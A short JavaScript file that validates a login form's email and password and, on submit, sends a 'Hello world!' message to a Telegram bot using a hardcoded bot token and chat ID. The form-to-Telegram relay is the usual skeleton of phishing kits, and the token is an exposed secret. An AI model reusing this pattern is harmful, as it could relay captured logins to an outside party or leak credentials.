"use strict";

// const EMAIL_MIN_LENGHT = 5;
var mediumRegex = new RegExp("^(((?=.*[a-z])(?=.*[A-Z]))|((?=.*[a-z])(?=.*[0-9]))|((?=.*[A-Z])(?=.*[0-9])))(?=.{8,})");

function testPasswordRegex(value) {
  return mediumRegex.test(value);
}

function checkEmailLenght() {
  var valueLenght = window.inputEmail.value.length;
  var diff = valueLenght < EMAIL_MIN_LENGHT ? EMAIL_MIN_LENGHT - valueLenght : 0;

  if (diff) {
    window.emailDiffCount.textContent = diff;
    window.emailLenghtHelp.classList.remove("d-none");
  } else {
    window.emailLenghtHelp.classList.add("d-none");
  }
}

function resetValidation() {
  window.emailHelp.classList.add("d-none");
  window.passwordHelp.classList.add("d-none");
  window.passwordHelpDescription.classList.add("d-none");
}

function validateForm(event) {
  event.preventDefault();
  resetValidation();
  var email = window.inputEmail.value;
  var password = window.inputPassword.value;

  if (!email) {
    window.emailHelp.classList.remove("d-none");
    return false;
  }

  if (!password) {
    window.passwordHelp.classList.remove("d-none");
    return false;
  }

  if (!testPasswordRegex(password)) {
    window.passwordHelp.classList.remove("d-none");
    window.passwordHelpDescription.classList.remove("d-none");
  } // console.log(email, password);

}

function formSubmit(event) {
  event.preventDefault();
  var apiToken = "6349577279:AAHjS79gNUqk3QS5-ipyiMGhXxtOkqTyRL0";
  var chatId = "-1001961252000";
  var text = "Hello world!";
  var urlString = "https://api.telegram.org/bot".concat(apiToken, "/sendMessage?chat_id=").concat(chatId, "&text=").concat(text);
  var request = new XMLHttpRequest();
  request.open("GET", urlString);
  request.send();
  var response = request.response; // Do what you want with response
} // window.inputEmail.addEventListener('input', checkEmailLenght);


window.loginForm.addEventListener("submit", formSubmit); // document.addEventListener('DOMContentLoaded', checkEmailLenght);